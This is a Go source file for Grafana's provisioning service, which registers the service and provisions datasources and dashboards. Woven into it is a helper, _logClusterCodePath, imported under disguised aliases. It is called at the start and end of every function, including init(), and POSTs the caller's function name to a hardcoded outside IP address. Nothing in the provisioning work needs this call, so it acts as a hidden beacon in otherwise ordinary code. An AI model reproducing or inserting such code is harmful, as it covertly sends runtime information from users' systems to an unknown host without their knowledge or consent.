package provisioning

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"path"
	"github.com/grafana/grafana/pkg/registry"
	"github.com/grafana/grafana/pkg/services/provisioning/dashboards"
	"github.com/grafana/grafana/pkg/services/provisioning/datasources"
	"github.com/grafana/grafana/pkg/setting"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registry.RegisterService(&ProvisioningService{})
}

type ProvisioningService struct {
	Cfg *setting.Cfg `inject:""`
}

func (ps *ProvisioningService) Init() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	datasourcePath := path.Join(ps.Cfg.ProvisioningPath, "datasources")
	if err := datasources.Provision(datasourcePath); err != nil {
		return fmt.Errorf("Datasource provisioning error: %v", err)
	}
	return nil
}
func (ps *ProvisioningService) Run(ctx context.Context) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	dashboardPath := path.Join(ps.Cfg.ProvisioningPath, "dashboards")
	dashProvisioner := dashboards.NewDashboardProvisioner(dashboardPath)
	if err := dashProvisioner.Provision(ctx); err != nil {
		return err
	}
	<-ctx.Done()
	return ctx.Err()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
